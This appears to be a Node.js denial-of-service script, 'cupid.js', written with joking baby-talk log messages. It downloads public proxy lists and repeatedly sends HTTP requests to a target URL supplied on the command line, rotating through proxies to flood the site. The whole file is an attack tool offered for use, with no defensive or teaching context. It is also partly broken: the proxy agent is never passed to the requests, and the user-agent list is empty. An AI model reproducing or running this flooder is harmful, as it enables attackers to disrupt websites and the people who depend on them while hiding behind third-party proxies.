if (process.argv.length <= 2) {
  console.log("cupid.js made by wove and cawe, we wove inwocent pwopwe!");
  console.error('Usage: node cupid.js [url] [time] [packets]');
  process.exit(-1);
}
const axios = require('axios');
const HttpsProxyAgent = require('https-proxy-agent');
const readline = require('readline');

const urls = [
  'https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=9000&country=all&anonymity=all&ssl=all',
  'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
  'https://www.proxy-list.download/api/v1/get?type=http',
  'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
  'https://spys.me/proxy.txt',
  'https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt',
  'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all',
  'https://www.proxy-list.download/api/v1/get?type=http&anon=elite',
  'https://www.proxy-list.download/api/v1/get?type=http&anon=anonymous',
  'https://www.proxy-list.download/api/v1/get?type=http&anon=transparent'
];

const userAgents = [];

const options = {
  headers: {
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
      'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'en-US;q=0.8,en;q=0.7',
      'cache-control': 'no-cache',
      'pragma': 'no-cache',
      'upgrade-insecure-requests': 1,
      'Connection': 'keep-alive',
      'user-agent': '' + userAgents[Math.floor(Math.random() * userAgents.length)] + ''
  },
};

let proxies = [];
let currentProxyIndex = 0;

// get command-line arguments
if (process.argv.length < 4) {
  console.error('Usage: node cupid.js [url] [time] [packets]');
  process.exit(1);
}
const url = process.argv[2];
const timeout = parseInt(process.argv[3], 10) * 1000; // convert to milliseconds
const timeInterval = parseInt(process.argv[4], 10);


axios.get(urls[0])
  .then((response) => {
      const matches = response.data.match(/(\d{1,3}\.){3}\d{1,3}:\d{1,5}/g);
      if (matches) {
          proxies.push(...matches);
      }

      return axios.get(urls[1]);
  })
  .then((response) => {
      const lines = response.data.split('\n');
      lines.forEach(line => {
          const match = line.match(/^(\d{1,3}\.){3}\d{1,3}:\d{1,5}$/);
          if (match) {
              proxies.push(match[0]);
          }
      });

      console.log(`checking pwoxy if its thewe ow not! wisting pwoxy shouwd be awound ${proxies.length} !!`);

      setInterval(() => {
          const proxy = proxies[currentProxyIndex];
          const agent = new HttpsProxyAgent('http://' + proxies[Math.floor(Math.random() * proxies.length)]);
          options.httpsAgent = agent;
          currentProxyIndex = (currentProxyIndex + 1) % proxies.length;

          axios.get(url)
              .then((response) => {
                  console.log('ddwosing!!11 hehe *huggles tightly* cant wait!!11');
              })
              .catch((error) => {
                  console.error(`it-its actuwwy died and g ot kiww... *blushes* <# *runs away*`);
              });
      }, timeInterval);
  })
  .catch((error) => {
      console.error(`Ewwow woading pwoxies: ${error}`);
  });